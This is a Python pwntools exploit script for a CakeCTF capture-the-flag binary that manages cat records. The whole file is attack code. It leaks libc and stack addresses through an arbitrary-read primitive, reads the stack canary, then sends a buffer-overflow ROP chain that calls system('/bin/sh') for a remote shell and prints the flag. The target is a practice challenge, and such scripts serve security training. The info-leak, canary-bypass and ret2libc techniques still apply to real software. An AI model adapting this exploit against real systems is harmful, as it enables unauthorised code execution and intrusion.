from pwn import *
import sys

elf = ELF("chall")
libc = ELF("./libc-2.31.so")

if sys.argv[1] == "r":
    p = remote("pwn.cakectf.com", 9004)
elif sys.argv[1] == "l":
    p = process("./chall", env={"LD_PRELOAD":"libc-2.31.so"})
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, gdbscript='''
                            continue
                            ''')

def new_cat(specie, age, name):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Species [0=Bengal Cat / 1=Ocicat / 2=Ocelot / 3=Savannah Cat]: ", str(specie))
    p.sendlineafter("Age: ", str(age))
    p.sendlineafter("Name: ", name)

def get_cat():
    p.sendlineafter(">> ", "2")
    p.recvuntil("Name: ")

def set_cat(age, name):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("Age: ", str(age))
    p.sendlineafter("Name: ", name)

def solve():
    # leak libc address
    new_cat(2, 1, "A") 
    set_cat(elf.symbols["stdout"], "A"*0x20)
    get_cat()
    libc.address = u64(p.recv(6) + "\x00\x00") - libc.symbols["_IO_2_1_stdout_"]
    success("libc addr: %s"%hex(libc.address))

    # leak stack address using environ
    new_cat(2, 1, "A") 
    set_cat(libc.symbols["environ"], "A"*0x20)
    get_cat()
    stack_addr = u64(p.recv(6) + "\x00\x00")
    success("stack addr: %s"%hex(stack_addr))
    
    # leak canary using stack address
    new_cat(2, 1, "A")
    set_cat(stack_addr - 0x120 + 0x1, "A"*0x20)
    get_cat()
    canary = u64("\x00" + p.recv(7))
    success("canary: %s"%hex(canary))

    # BOF to win!
    rop_ret = 0x00403a34
    rop_pop_rdi = 0x00403a33
    payload = "B"*0x88
    payload += p64(canary)
    payload += p64(0xdeadbeefcafebabe) * 3
    payload += p64(rop_ret)
    payload += p64(rop_pop_rdi)
    payload += p64(stack_addr - 0xe0 )
    payload += p64(libc.symbols["system"])
    payload += "/bin/sh\x00"

    new_cat(0, 1, payload)
    p.recv()
    p.sendline("0")
    p.sendline("cat flag*")
    p.interactive()
if __name__ == "__main__":
    solve()